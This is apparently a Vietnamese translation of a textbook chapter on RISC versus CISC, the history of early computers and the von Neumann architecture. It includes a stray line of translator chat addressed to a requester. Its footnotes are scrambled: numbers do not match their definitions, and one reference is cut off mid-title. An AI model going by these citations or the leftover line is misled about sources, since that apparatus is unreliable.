<p>Tại thời điểm đó, kiến trúc RISC là một bước ngoặt so với quan điểm phổ biến rằng ISA cần ngày càng phức tạp để đạt hiệu năng cao. “Cách tiếp cận RISC khác với các máy tính CISC phổ biến lúc bấy giờ ở chỗ nó yêu cầu một tập nhỏ các lệnh đơn giản và tổng quát (các chức năng mà máy tính cần thực hiện), sử dụng ít transistor hơn so với tập lệnh phức tạp và giảm khối lượng công việc mà máy tính phải xử lý.”<sup class="footnote-reference"><a href="#2">2</a></sup></p>
<p>ISA kiểu CISC biểu diễn chương trình bằng ít lệnh hơn so với RISC, thường dẫn đến tệp thực thi chương trình nhỏ hơn. Trên các hệ thống có bộ nhớ chính nhỏ, kích thước tệp thực thi là yếu tố quan trọng ảnh hưởng đến hiệu năng chương trình, vì tệp lớn sẽ chiếm nhiều không gian RAM, làm giảm bộ nhớ dành cho các phần khác của chương trình đang chạy. Các vi kiến trúc dựa trên CISC cũng thường được tối ưu hóa để thực thi hiệu quả các lệnh CISC có độ dài biến đổi và chức năng cao. Mạch điện chuyên biệt để thực thi các lệnh phức tạp có thể giúp thực thi hiệu quả hơn các chức năng cấp cao cụ thể, nhưng phải đánh đổi bằng việc tăng độ phức tạp cho toàn bộ quá trình thực thi lệnh.</p>
<p>Khi so sánh RISC với CISC, chương trình RISC có nhiều lệnh hơn để thực thi, nhưng mỗi lệnh lại được thực thi hiệu quả hơn hầu hết các lệnh CISC, và RISC cho phép thiết kế vi kiến trúc đơn giản hơn CISC. Chương trình CISC có ít lệnh hơn, và vi kiến trúc CISC được thiết kế để thực thi hiệu quả các lệnh phức tạp hơn, nhưng lại yêu cầu thiết kế vi kiến trúc phức tạp hơn và xung nhịp cao hơn. Nhìn chung, bộ xử lý RISC mang lại thiết kế hiệu quả hơn và hiệu năng tốt hơn. Khi dung lượng bộ nhớ máy tính ngày càng tăng, kích thước tệp thực thi không còn là yếu tố quan trọng đối với hiệu năng chương trình. Tuy nhiên, CISC vẫn là ISA chiếm ưu thế, phần lớn là do được ngành công nghiệp triển khai và hỗ trợ.</p>
<p>Hiện nay, CISC vẫn là ISA chủ đạo cho máy tính để bàn và nhiều máy chủ cấp cao. Ví dụ, các ISA x86 của Intel đều dựa trên CISC. ISA kiểu RISC phổ biến hơn trong các máy chủ cao cấp (ví dụ: SPARC) và thiết bị di động (ví dụ: ARM) nhờ yêu cầu năng lượng thấp. Một triển khai vi kiến trúc cụ thể của ISA kiểu RISC hoặc CISC có thể kết hợp cả thiết kế RISC và CISC bên trong. Ví dụ, hầu hết các bộ xử lý CISC sử dụng microcode để code hóa một số lệnh CISC thành tập lệnh giống RISC hơn mà bộ xử lý bên dưới sẽ thực thi, và một số tập lệnh RISC hiện đại cũng chứa một vài lệnh phức tạp hoặc chế độ định địa chỉ nâng cao hơn so với tập lệnh MIPS và Berkeley RISC ban đầu.</p>
<p>Tất cả các bộ xử lý hiện đại, bất kể ISA của chúng là gì, đều tuân theo mô hình kiến trúc von Neumann. Thiết kế đa dụng của kiến trúc von Neumann cho phép nó thực thi bất kỳ loại chương trình nào. Nó sử dụng mô hình lưu trữ chương trình, nghĩa là lệnh chương trình được lưu trong bộ nhớ máy tính cùng với dữ liệu chương trình, và cả hai đều là đầu vào cho bộ xử lý.</p>
<p>Chương này giới thiệu kiến trúc von Neumann cùng với nguồn gốc và các thành phần nền tảng của kiến trúc máy tính hiện đại. Ta sẽ xây dựng một bộ xử lý số (CPU) ví dụ dựa trên mô hình kiến trúc von Neumann, thiết kế CPU từ các mạch số được xây dựng từ các khối cổng logic, và trình bày cách CPU thực thi các lệnh chương trình.</p>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
<p>ACM Turing Award 2017 – David Patterson &amp; John Hennessy.<br />
<sup class="footnote-reference"><a href="#2">2</a></sup>: Hennessy, John &amp; Patterson, David. <em>Computer Architecture: A Quantitative Approach</em>. Morgan Kaufmann, 2017.</p>
</div>
<div style="break-before: page; page-break-before: always;"></div><h2 id="51-nguồn-gốc-của-kiến-trúc-máy-tính-hiện-đại"><a class="header" href="#51-nguồn-gốc-của-kiến-trúc-máy-tính-hiện-đại">5.1. Nguồn gốc của Kiến trúc Máy tính Hiện đại</a></h2>
<p>Khi lần theo nguồn gốc của kiến trúc máy tính hiện đại, ta dễ bị cuốn vào suy nghĩ rằng các máy tính hiện đại là một chuỗi tiến hóa tuyến tính, trong đó mỗi máy đơn giản là một phiên bản cải tiến của máy tiền nhiệm. Mặc dù cách nhìn nhận này có thể đúng với một số lớp kiến trúc nhất định (hãy nghĩ đến các cải tiến tuần tự của iPhone X từ chiếc iPhone đầu tiên), thì gốc rễ của cây kiến trúc lại không rõ ràng như vậy.</p>
<p>Từ những năm 1700 đến đầu những năm 1900, các nhà toán học chính là những <em>máy tính con người</em> đầu tiên, thực hiện các phép tính phục vụ cho các ứng dụng khoa học và kỹ thuật¹. Từ “computer” ban đầu dùng để chỉ “người tính toán”. Các nữ toán học thường đảm nhiệm vai trò này. Thực tế, việc sử dụng phụ nữ làm máy tính con người phổ biến đến mức độ phức tạp tính toán từng được đo bằng đơn vị “kilo-girls”, tức là khối lượng công việc mà một nghìn máy tính con người có thể hoàn thành trong một giờ². Phụ nữ được xem là giỏi hơn nam giới trong việc thực hiện các phép toán, vì họ thường làm việc có phương pháp hơn. Tuy nhiên, họ không được phép giữ chức danh kỹ sư, và do đó bị phân công vào các công việc “tầm thường” hơn như thực hiện các phép tính phức tạp.</p>
<p>Chiếc máy tính số đa dụng đầu tiên, <em>Analytical Engine</em>, được thiết kế bởi nhà toán học người Anh Charles Babbage, người được một số người xem là cha đẻ của máy tính. Analytical Engine là phần mở rộng của phát minh ban đầu của ông – Difference Engine – một máy tính cơ học có khả năng tính toán các hàm đa thức. Ada Lovelace, người có lẽ nên được gọi là mẹ của ngành điện toán, là người đầu tiên phát triển chương trình máy tính và công bố thuật toán có thể được tính toán bằng Analytical Engine của Babbage. Trong ghi chú của bà có đoạn thể hiện sự nhận thức về tính chất đa dụng của Analytical Engine: “[t]he Analytical Engine has no pretensions whatever to originate anything. It can do whatever we know how to order it to perform.”³ Tuy nhiên, khác với máy tính hiện đại, Analytical Engine là một thiết bị cơ học và chỉ được xây dựng một phần. Hầu hết các nhà thiết kế của những cỗ máy tiền thân trực tiếp của máy tính hiện đại đều không biết đến công trình của Babbage và Lovelace khi họ phát triển các thiết bị của riêng mình.</p>
<p>Do đó, có lẽ chính xác hơn khi xem kiến trúc máy tính hiện đại như được hình thành từ “nồi súp nguyên thủy” của các ý tưởng và đổi mới xuất hiện vào những năm 1930 và 1940. Ví dụ, năm 1937, Claude Shannon – một sinh viên tại MIT – đã viết luận văn thạc sĩ được xem là có ảnh hưởng nhất mọi thời đại. Dựa trên công trình của George Boole (nhà toán học đã phát triển đại số Boolean), Shannon chứng minh rằng logic Boolean có thể được áp dụng vào mạch điện và dùng để phát triển các công tắc điện. Điều này dẫn đến sự ra đời của hệ thống tính toán nhị phân và phần lớn thiết kế mạch số sau này. Trong khi nam giới thiết kế nhiều máy tính điện tử đầu tiên, phụ nữ (vốn không được phép làm kỹ sư) lại trở thành những người tiên phong trong lập trình, dẫn đầu việc thiết kế và phát triển nhiều đổi mới phần mềm ban đầu như ngôn ngữ lập trình, trình biên dịch, thuật toán và hệ điều hành.</p>
<p>Việc thảo luận toàn diện về sự hình thành của kiến trúc máy tính nằm ngoài phạm vi của cuốn sách này (xem <em>Turing’s Cathedral</em>⁴ của George Dyson và <em>The Innovators</em>⁶ của Walter Isaacson để có cái nhìn chi tiết hơn); tuy nhiên, chúng ta sẽ điểm qua một số đổi mới quan trọng trong thập niên 1930 và 1940 đã góp phần hình thành kiến trúc máy tính hiện đại.</p>
<h3 id="511-máy-turing"><a class="header" href="#511-máy-turing">5.1.1. Máy Turing</a></h3>
<p>Năm 1937, nhà toán học người Anh Alan Turing đã đề xuất⁷ “Logical Computing Machine” – một máy tính lý thuyết. Turing sử dụng cỗ máy này để chứng minh rằng không tồn tại lời giải cho bài toán quyết định (tiếng Đức: <em>Entscheidungsproblem</em>) do các nhà toán học David Hilbert và Wilhelm Ackermann đặt ra vào năm 1928. Bài toán quyết định là một thuật toán nhận đầu vào là một mệnh đề và xác định xem mệnh đề đó có đúng với mọi trường hợp hay không. Turing chứng minh rằng không tồn tại thuật toán như vậy bằng cách chỉ ra rằng <em>halting problem</em> (liệu máy <em>X</em> có dừng lại với đầu vào <em>y</em> hay không?) là không thể quyết định được đối với máy của ông. Trong quá trình chứng minh, Turing mô tả một cỗ máy phổ quát có khả năng thực hiện các tác vụ của bất kỳ máy tính nào khác. Alonzo Church – giáo sư hướng dẫn luận văn của Turing tại Đại học Princeton – là người đầu tiên gọi “logical computing machine” là <em>Turing machine</em>, và phiên bản phổ quát của nó là <em>universal Turing machine</em>.</p>
<p>Sau đó, Turing trở về Anh và phục vụ đất nước trong đơn vị giải code tại Bletchley Park trong Thế chiến II. Ông đóng vai trò quan trọng trong việc thiết kế và chế tạo <em>Bombe</em> – một thiết bị điện cơ giúp phá code do máy Enigma tạo ra, vốn được Đức Quốc xã sử dụng phổ biến để bảo vệ thông tin liên lạc nhạy cảm trong chiến tranh.</p>
<p>Sau chiến tranh, Turing thiết kế <em>automatic computing engine</em> (ACE). ACE là một máy tính lưu trữ chương trình, nghĩa là cả lệnh chương trình và dữ liệu đều được nạp vào bộ nhớ máy tính và được thực thi bởi máy tính đa dụng. Bài báo của ông, công bố năm 1946, có lẽ là mô tả chi tiết nhất về một máy tính như vậy⁸.</p>
<h3 id="512-các-máy-tính-Điện-tử-Đầu-tiên"><a class="header" href="#512-các-máy-tính-Điện-tử-Đầu-tiên">5.1.2. Các Máy Tính Điện Tử Đầu Tiên</a></h3>
<p>Thế chiến II đã thúc đẩy mạnh mẽ sự phát triển của các máy tính đầu tiên. Tuy nhiên, do tính chất tuyệt mật của các hoạt động quân sự trong chiến tranh, nhiều chi tiết về các đổi mới diễn ra trong thời kỳ sôi động này không được công bố rộng rãi cho đến nhiều năm sau. Một ví dụ điển hình là Colossus – một cỗ máy do kỹ sư người Anh Tommy Flowers thiết kế để giúp phá code Lorenz, được Đức Quốc xã dùng để code hóa thông tin tình báo cấp cao. Một phần công trình của Alan Turing đã hỗ trợ thiết kế Colossus. Được xây dựng năm 1943, Colossus được xem là máy tính đầu tiên có khả năng lập trình, kỹ thuật số và hoàn toàn điện tử. Tuy nhiên, nó là máy tính chuyên dụng, được thiết kế riêng cho mục đích giải code. Lực lượng Nữ Hải quân Hoàng gia Anh (WRNS, gọi là “Wrens”) đảm nhiệm vai trò vận hành Colossus. Mặc dù <em>General Report of the Tunny</em>¹⁴ ghi nhận rằng một số thành viên Wrens có năng lực trong công việc mật code, nhưng không ai trong số họ được trao chức danh chuyên gia mật code, mà chỉ được giao các nhiệm vụ vận hành Colossus mang tính lặp lại¹⁵.</p>
<p>Ở bên kia Đại Tây Dương, các nhà khoa học và kỹ sư Mỹ cũng đang miệt mài phát triển máy tính của riêng mình. Giáo sư Harvard Howard Aiken (đồng thời là sĩ quan Hải quân Dự bị Hoa Kỳ) đã thiết kế Mark I – một máy tính điện cơ, đa dụng, có khả năng lập trình. Được xây dựng năm 1944, nó hỗ trợ việc thiết kế bom nguyên tử. Aiken phát triển máy tính của mình gần như không biết đến công trình của Turing, và được thúc đẩy bởi mục tiêu hiện thực hóa chiếc Analytical Engine của Charles Babbage⁶. Một đặc điểm quan trọng của Mark I là nó hoàn toàn tự động và có thể chạy liên tục trong nhiều ngày mà không cần can thiệp của con người⁶ – đây sẽ là một đặc điểm nền tảng trong thiết kế máy tính tương lai.</p>
<p>Trong khi đó, các kỹ sư Mỹ John Mauchly và Presper Eckert tại Đại học Pennsylvania đã thiết kế và xây dựng <em>Electronic Numerical Integrator and Computer</em> (ENIAC) vào năm 1945. ENIAC được xem là tiền thân của máy tính hiện đại. Nó là máy tính kỹ thuật số (dù sử dụng hệ thập phân thay vì nhị phân), hoàn toàn điện tử, có khả năng lập trình và đa dụng. Mặc dù phiên bản ban đầu của ENIAC chưa có khả năng lưu trữ chương trình, tính năng này đã được tích hợp vào máy trước khi thập kỷ kết thúc. ENIAC được tài trợ và xây dựng cho Phòng Thí nghiệm Nghiên cứu Đạn đạo của Quân đội Hoa Kỳ, và được thiết kế chủ yếu để tính toán quỹ đạo đạn đạo. Sau này, nó còn được sử dụng để hỗ trợ thiết kế bom nhiệt hạch.</p>
<p>Dưới đây là bản dịch hoàn chỉnh của phần văn bản bạn cung cấp, tuân thủ đầy đủ các quy tắc dịch thuật kỹ thuật và cú pháp footnote Markdown như bạn yêu cầu:</p>
<p>Khi nam giới được điều động vào quân đội trong Thế chiến II, phụ nữ được tuyển dụng để hỗ trợ nỗ lực chiến tranh với vai trò là các máy tính con người. Khi những máy tính điện tử đầu tiên xuất hiện, phụ nữ trở thành những lập trình viên đầu tiên, vì công việc lập trình lúc đó được xem là công việc thư ký. Không có gì ngạc nhiên khi nhiều đổi mới ban đầu trong lập trình – như trình biên dịch đầu tiên, khái niệm phân chia chương trình thành mô-đun, kỹ thuật gỡ lỗi (debugging), và ngôn ngữ assembly – đều được ghi nhận là do phụ nữ sáng tạo. Ví dụ, Grace Hopper đã phát triển ngôn ngữ lập trình cấp cao đầu tiên, độc lập với phần cứng (COBOL), cùng với trình biên dịch của nó. Bà cũng là lập trình viên cho máy Mark I và là tác giả cuốn sách mô tả cách vận hành của nó.</p>
<p>Những lập trình viên của ENIAC gồm sáu phụ nữ: Jean Jennings Bartik, Betty Snyder Holberton, Kay McNulty Mauchly, Frances Bilas Spence, Marlyn Wescoff Meltzer, và Ruth Lichterman Teitelbaum. Khác với các Wrens, nhóm phụ nữ ENIAC được trao quyền tự chủ rất lớn trong công việc; họ chỉ được cung cấp sơ đồ dây nối của ENIAC và được yêu cầu tự tìm hiểu cách hoạt động và cách lập trình nó. Ngoài việc sáng tạo ra cách lập trình (và gỡ lỗi) cho một trong những máy tính điện tử đa dụng đầu tiên trên thế giới, các lập trình viên ENIAC còn phát triển khái niệm sơ đồ luồng thuật toán (algorithmic flow chart), và các khái niệm lập trình quan trọng như thủ tục con (subroutine) và lồng ghép (nesting). Giống như Grace Hopper, Jean Jennings Bartik và Betty Snyder Holberton sau này đều có sự nghiệp lâu dài trong ngành điện toán, và là những người tiên phong trong lĩnh vực này. Đáng tiếc là mức độ đóng góp của phụ nữ trong giai đoạn đầu của ngành điện toán vẫn chưa được ghi nhận đầy đủ. Do không thể thăng tiến, nhiều phụ nữ đã rời khỏi lĩnh vực này sau Thế chiến II. Để tìm hiểu thêm về các lập trình viên nữ thời kỳ đầu, bạn đọc có thể tham khảo <em>Recoding Gender</em> của Janet Abbate<sup class="footnote-reference"><a href="#11">1</a></sup>, phim tài liệu <em>Top Secret Rosies</em> do PBS sản xuất<sup class="footnote-reference"><a href="#12">2</a></sup> do LeAnn Erickson đạo diễn, và <em>The Computers</em> của Kathy Kleiman<sup class="footnote-reference"><a href="#13">3</a></sup>.</p>
<p>Không chỉ Anh và Mỹ quan tâm đến tiềm năng của máy tính. Tại Đức, Konrad Zuse đã phát triển máy tính số điện cơ đa dụng đầu tiên có khả năng lập trình – Z3 – hoàn thành vào năm 1941. Zuse tự mình thiết kế máy này mà không hề biết đến công trình của Turing hay các nhà khoa học khác. Đáng chú ý, thiết kế của Zuse sử dụng hệ nhị phân (thay vì thập phân), là máy tính đầu tiên thuộc loại này dùng hệ nhị phân. Tuy nhiên, Z3 đã bị phá hủy trong một cuộc không kích vào Berlin, và Zuse không thể tiếp tục công việc cho đến năm 1950. Công trình của ông phần lớn không được công nhận cho đến nhiều năm sau. Ngày nay, ông được xem là cha đẻ của ngành điện toán tại Đức.</p>
<h3 id="513-vậy-von-neumann-biết-những-gì"><a class="header" href="#513-vậy-von-neumann-biết-những-gì">5.1.3. Vậy von Neumann Biết Những Gì?</a></h3>
<p>Từ phần thảo luận về nguồn gốc của kiến trúc máy tính hiện đại, có thể thấy rằng trong thập niên 1930 và 1940 đã có nhiều đổi mới dẫn đến sự ra đời của máy tính như chúng ta biết ngày nay. Năm 1945, John von Neumann công bố bài viết <em>First draft of a report on the EDVAC</em><sup class="footnote-reference"><a href="#9">4</a></sup>, mô tả một kiến trúc làm nền tảng cho các máy tính hiện đại. EDVAC là hậu duệ của ENIAC. Nó khác ENIAC ở chỗ là máy tính nhị phân thay vì thập phân, và là máy tính lưu trữ chương trình. Ngày nay, mô tả kiến trúc của EDVAC trong bài viết đó được gọi là <em>von Neumann architecture</em>.</p>
<p><strong>Von Neumann architecture</strong> mô tả một máy tính đa dụng – được thiết kế để chạy bất kỳ chương trình nào. Nó cũng sử dụng mô hình lưu trữ chương trình, nghĩa là cả lệnh chương trình và dữ liệu đều được nạp vào máy tính để thực thi. Trong mô hình von Neumann, không có sự phân biệt giữa lệnh và dữ liệu; cả hai đều được nạp vào bộ nhớ trong của máy tính, và lệnh chương trình được truy xuất từ bộ nhớ và thực thi bởi các đơn vị chức năng của máy tính trên dữ liệu chương trình.</p>
<p>Đóng góp của John von Neumann đan xen với nhiều câu chuyện trước đó trong lịch sử điện toán. Là một nhà toán học người Hungary, ông từng là giáo sư tại Viện Nghiên cứu Cao cấp và Đại học Princeton, và từng là người cố vấn ban đầu cho Alan Turing. Sau này, von Neumann trở thành nhà khoa học nghiên cứu trong Dự án Manhattan, điều này đưa ông đến với Howard Aiken và máy Mark I; ông cũng từng là cố vấn cho dự án ENIAC, và thường xuyên trao đổi thư từ với Eckert và Mauchly. Bài viết nổi tiếng mô tả EDVAC của ông xuất phát từ công trình về <em>Electronic Discrete Variable Automatic Computer</em> (EDVAC), được Eckert và Mauchly đề xuất với Quân đội Hoa Kỳ, và được xây dựng tại Đại học Pennsylvania. EDVAC bao gồm nhiều đổi mới trong thiết kế kiến trúc, tạo nền tảng cho hầu hết các máy tính hiện đại: nó là máy đa dụng, sử dụng hệ số nhị phân, có bộ nhớ trong, và hoàn toàn điện tử. Phần lớn vì von Neumann là tác giả duy nhất của bài viết<sup class="footnote-reference"><a href="#9">4</a></sup>, nên thiết kế kiến trúc được mô tả trong đó chủ yếu được ghi nhận cho ông và được gọi là kiến trúc von Neumann. Cần lưu ý rằng Turing đã mô tả rất chi tiết thiết kế của một máy tương tự vào năm 1946. Tuy nhiên, vì bài viết của von Neumann được công bố trước bài của Turing, nên ông được ghi nhận chính cho những đổi mới này.</p>
<p>Dù ai là người “thật sự” phát minh ra kiến trúc von Neumann, thì đóng góp của von Neumann vẫn không thể phủ nhận. Ông là một nhà toán học và nhà khoa học xuất chúng. Các đóng góp của ông trong toán học trải rộng từ lý thuyết tập hợp đến cơ học lượng tử và lý thuyết trò chơi. Trong lĩnh vực điện toán, ông cũng được xem là người phát minh ra thuật toán <em>merge sort</em>. Walter Isaacson, trong cuốn <em>The Innovators</em>, cho rằng một trong những thế mạnh lớn nhất của von Neumann là khả năng hợp tác rộng rãi và trực giác nhạy bén với các khái niệm mới<sup class="footnote-reference"><a href="#6">5</a></sup>. Nhiều nhà thiết kế máy tính thời kỳ đầu làm việc khá biệt lập. Isaacson lập luận rằng khi chứng kiến sự chậm chạp của máy Mark I, von Neumann đã trực giác nhận ra giá trị của một máy tính điện tử thực sự, và sự cần thiết của việc lưu trữ và sửa đổi chương trình trong bộ nhớ. Do đó, có thể cho rằng von Neumann – thậm chí hơn cả Eckert và Mauchly – đã nắm bắt và đánh giá đầy đủ sức mạnh của một máy tính điện tử lưu trữ chương trình<sup class="footnote-reference"><a href="#6">5</a></sup>.</p>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">6</sup>
<p>Grier, David Alan. <em>When Computers Were Human</em>. Princeton University Press, 2005.<br />
<sup class="footnote-reference"><a href="#2">7</a></sup>: Light, Jennifer S. <em>When Computers Were Women</em>. Technology and Culture, Vol. 40, No. 3 (1999), pp. 455–483.<br />
<sup class="footnote-reference"><a href="#3">8</a></sup>: Lovelace, Ada. <em>Notes by the Translator</em>. In Menabrea, Luigi Federico. <em>Sketch of the Analytical Engine Invented by Charles Babbage</em>. 1842.<br />
<sup class="footnote-reference"><a href="#4">9</a></sup>: Dyson, George. <em>Turing’s Cathedral: The Origins of the Digital Universe</em>. Pantheon Books, 2012.<br />
<sup class="footnote-reference"><a href="#5">10</a></sup>: B. Jack Copeland et al., <em>Colossus: The Secrets of Bletchley Park’s Codebreaking Computers</em>. Oxford University Press, 2006.<br />
<sup class="footnote-reference"><a href="#6">5</a></sup>: Isaacson, Walter. <em>The Innovators: How a Group of Hackers, Geniuses, and Geeks Created the Digital Revolution</em>. Simon &amp; Schuster, 2014.<br />
<sup class="footnote-reference"><a href="#7">11</a></sup>: Turing, Alan. <em>On Computable Numbers, with an Application to the Entscheidungsproblem</em>. Proceedings of the London Mathematical Society, 1936.<br />
<sup class="footnote-reference"><a href="#8">12</a></sup>: Turing, Alan. <em>Proposed Electronic Calculator</em>. National Physical Laboratory Report, 1946.<br />
<sup class="footnote-reference"><a href="#9">4</a></sup>: von Neumann, John. <em>First Draft of a Report on the EDVAC</em>. 1945.<br />
<sup class="footnote-reference"><a href="#11">1</a></sup>: Abbate, Janet. <em>Recoding Gender: Women’s Changing Participation in Computing</em>. MIT Press, 2012.<br />
<sup class="footnote-reference"><a href="#12">2</a></sup>: Erickson, LeAnn. <em>Top Secret Rosies: The Female Computers of WWII</em>. PBS Documentary, 2010.<br />
<sup class="footnote-reference"><a href="#13">3</a></sup>: Kleiman, Kathy. <em>The Computers</em>. Documentary, 2016.<br />
<sup class="footnote-reference"><a href="#14">13</a></sup>: <em>General Report on Tunny</em>, British Government Code and Cypher School, 1945.<br />
<sup class="footnote-reference"><a href="#15">14</a></sup>: Hicks, Marie. *Programmed Inequality: How Britain Discarded Women Technologists and Lost Its Edge in Com</p>
</div>
<h3 id="514-references"><a class="header" href="#514-references">5.1.4. References</a></h3>
<ol>
<li>
<p>David Alan Grier, <em>&quot;When Computers Were Human&quot;</em>, Princeton
University Press, 2005.</p>
</li>
<li>
<p>Megan Garber, <em>&quot;Computing Power Used to be Measured in
'Kilo-Girls'&quot;</em>. The Atlantic, October 16, 2013.
<a href="https://www.theatlantic.com/technology/archive/2013/10/computing-power-used-to-be-measured-in-kilo-girls/280633/">https://www.theatlantic.com/technology/archive/2013/10/computing-power-used-to-be-measured-in-kilo-girls/280633/</a>{.bare}</p>
</li>
<li>
<p>Betty Alexandra Toole, <em>&quot;Ada, The Enchantress of Numbers&quot;</em>.
Strawberry Press, 1998.</p>
</li>
<li>
<p>George Dyson, <em>Turing's Cathedral: the origins of the digital
universe</em>. Pantheon. 2012.</p>
</li>
<li>
<p>Jack Copeland, <em>&quot;Colossus: The Secrets of Bletchley Park's
Code-breaking Computers&quot;</em>.</p>
</li>
<li>
<p>Walter Isaacson. <em>&quot;The Innovators: How a group of inventors,
hackers, genius and geeks created the digital revolution&quot;</em>. Simon
and Schuster. 2014.</p>
</li>
<li>
<p>Alan M. Turing. <em>&quot;On computable numbers, with an application to the
Entscheidungsproblem&quot;</em>. <em>Proceedings of the London mathematical
society</em> 2(1). pp. 230---​265. 1937.</p>
</li>
<li>
<p>Brian Carpenter and Robert Doran. <em>&quot;The other Turing Machine&quot;</em>.
<em>The Computer Journal</em> 20(3) pp. 269---​279. 1977.</p>
</li>
<li>
<p>John von Neumann. <em>&quot;First Draft of a Report on the EDVAC (1945)&quot;</em>.
Reprinted in <em>IEEE Annals of the history of computing</em> 4. pp.
27---​75. 1993.</p>
</li>
<li>
<p>Arthur Burks, Herman Goldstine, John von Neumann. <em>&quot;Preliminary
discussion of the logical design of an electronic computing
instrument (1946)&quot;</em>. Reprinted by <em>The Origins of Digital
Computers</em> (Springer), pp. 399---​413. 1982.</p>
</li>
<li>
<p>Janet Abbate. <em>&quot;Recoding gender: Women's changing participation in
computing&quot;</em>. MIT Press. 2012.</p>
</li>
<li>
<p>LeAnn Erickson. <em>&quot;Top Secret Rosies: The Female Computers of World
War II&quot;</em>. Public Broadcasting System. 2010.</p>
</li>
<li>
<p>Kathy Kleiman, <em>&quot;The Computers&quot;</em>.
<a href="http://eniacprogrammers.org/">http://eniacprogrammers.org/</a>{.bare}</p>
</li>
<li>
<p><em>&quot;Breaking Teleprinter Ciphers at Bletchley Park: An edition of
I.J. Good, D. Michie and G. Timms: General Report on Tunny with
Emphasis on Statistical Methods (1945)&quot;</em>. Editors: Reeds, Diffie,
Fields. Wiley, 2015.</p>
</li>
<li>
<p>Janet Abbate, <em>&quot;Recoding Gender&quot;</em>, MIT Press, 2012.</p>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="52-kiến-trúc-von-neumann"><a class="header" href="#52-kiến-trúc-von-neumann">5.2. Kiến trúc von Neumann</a></h2>
<p>Kiến trúc von Neumann là nền tảng của hầu hết các máy tính hiện đại. Trong phần này, chúng ta sẽ mô tả ngắn gọn các thành phần chính của kiến trúc này.</p>
<p>Kiến trúc von Neumann (minh họa trong Hình 1) bao gồm năm thành phần chính:</p>
<ol>
<li>
<p><strong>Processing unit</strong> (đơn vị xử lý): thực thi các lệnh chương trình.</p>
</li>
<li>
<p><strong>Control unit</strong> (đơn vị điều khiển): điều phối việc thực thi lệnh chương trình trên đơn vị xử lý. Hai đơn vị này kết hợp lại tạo thành CPU.</p>
</li>
<li>
<p><strong>Memory unit</strong> (đơn vị bộ nhớ): lưu trữ dữ liệu và lệnh chương trình.</p>
</li>
<li>
<p><strong>Input unit(s)</strong> (đơn vị vào): nạp dữ liệu và lệnh chương trình vào máy tính, khởi động quá trình thực thi chương trình.</p>
</li>
<li>
<p><strong>Output unit(s)</strong> (đơn vị ra): lưu trữ hoặc nhận kết quả chương trình.</p>
</li>
</ol>
<p>Các đơn vị được kết nối với nhau thông qua các bus, dùng để truyền thông tin điều khiển và dữ liệu giữa các đơn vị. Một <strong>bus</strong> là kênh truyền thông dùng để chuyển các giá trị nhị phân giữa các điểm đầu cuối truyền thông (bên gửi và bên nhận). Ví dụ, một data bus kết nối đơn vị bộ nhớ và CPU có thể được triển khai dưới dạng 32 dây song song, cùng nhau truyền một giá trị 4 byte, mỗi dây truyền 1 bit. Thông thường, kiến trúc máy tính có các bus riêng biệt để truyền dữ liệu, địa chỉ bộ nhớ và tín hiệu điều khiển giữa các đơn vị. Các đơn vị sử dụng control bus để gửi tín hiệu điều khiển nhằm yêu cầu hoặc thông báo hành động cho đơn vị khác, sử dụng address bus để gửi địa chỉ bộ nhớ của yêu cầu đọc hoặc ghi đến đơn vị bộ nhớ, và sử dụng data bus để truyền dữ liệu giữa các đơn vị.</p>
<p><img src="C5-Arch/_images/vonNArch.png" alt="the 5 units of the von Neumann architecture are shown as boxes, the units are connected by buses shown as lines running below the boxes to which each box is connected." /></p>
<p><strong>Hình 1. Kiến trúc von Neumann bao gồm các đơn vị xử lý, điều khiển, bộ nhớ, vào và ra.</strong><br />
Đơn vị điều khiển và đơn vị xử lý tạo thành CPU, bao gồm ALU, các thanh ghi đa dụng của CPU, và một số thanh ghi chuyên dụng (IR và PC). Các đơn vị được kết nối với nhau bằng các bus dùng để truyền dữ liệu và giao tiếp giữa các đơn vị.</p>
<h3 id="521-cpu"><a class="header" href="#521-cpu">5.2.1. CPU</a></h3>
<p>Đơn vị điều khiển và đơn vị xử lý cùng nhau triển khai CPU — phần của máy tính thực thi các lệnh chương trình trên dữ liệu chương trình.</p>
<h3 id="522-Đơn-vị-xử-lý-processing-unit"><a class="header" href="#522-Đơn-vị-xử-lý-processing-unit">5.2.2. Đơn vị xử lý (Processing Unit)</a></h3>
<p><strong>Processing unit</strong> của máy von Neumann gồm hai phần. Phần đầu tiên là <strong>arithmetic/logic unit</strong> (ALU – &quot;đơn vị số học/logic&quot;), thực hiện các phép toán như cộng, trừ, hoặc logic, v.v. Các ALU hiện đại thường thực hiện được một tập hợp lớn các phép toán số học. Phần thứ hai của đơn vị xử lý là tập hợp các thanh ghi. Một <strong>register</strong> (thanh ghi) là một đơn vị lưu trữ nhỏ và nhanh, dùng để giữ dữ liệu chương trình và các lệnh đang được ALU thực thi.</p>
<p>Điểm quan trọng là trong kiến trúc von Neumann, không có sự phân biệt giữa lệnh và dữ liệu. Về mặt bản chất, lệnh <em>chính là</em> dữ liệu. Do đó, mỗi thanh ghi có thể lưu một từ dữ liệu (data word).</p>
<h3 id="523-Đơn-vị-điều-khiển-control-unit"><a class="header" href="#523-Đơn-vị-điều-khiển-control-unit">5.2.3. Đơn vị điều khiển (Control Unit)</a></h3>
<p><strong>Control unit</strong> điều phối việc thực thi các lệnh chương trình bằng cách nạp chúng từ bộ nhớ và truyền toán hạng cùng phép toán đến đơn vị xử lý. Đơn vị điều khiển cũng bao gồm một số phần lưu trữ để theo dõi trạng thái thực thi và xác định hành động tiếp theo cần thực hiện:</p>
<ul>
<li><strong>Program counter</strong> (PC – &quot;bộ đếm chương trình&quot;): lưu địa chỉ bộ nhớ của lệnh tiếp theo cần thực thi.</li>
<li><strong>Instruction register</strong> (IR – &quot;thanh ghi lệnh&quot;): lưu lệnh được nạp từ bộ nhớ, đang được thực thi.</li>
</ul>
<h3 id="524-Đơn-vị-bộ-nhớ-memory-unit"><a class="header" href="#524-Đơn-vị-bộ-nhớ-memory-unit">5.2.4. Đơn vị bộ nhớ (Memory Unit)</a></h3>
<p>Bộ nhớ trong là một cải tiến quan trọng của kiến trúc von Neumann. Nó cung cấp khả năng lưu trữ dữ liệu chương trình gần với đơn vị xử lý, giúp giảm đáng kể thời gian thực hiện tính toán. <strong>Memory unit</strong> lưu trữ cả dữ liệu chương trình và lệnh chương trình — việc lưu trữ lệnh chương trình là một phần cốt lõi của mô hình chương trình lưu trữ (stored-program model) trong kiến trúc von Neumann.</p>
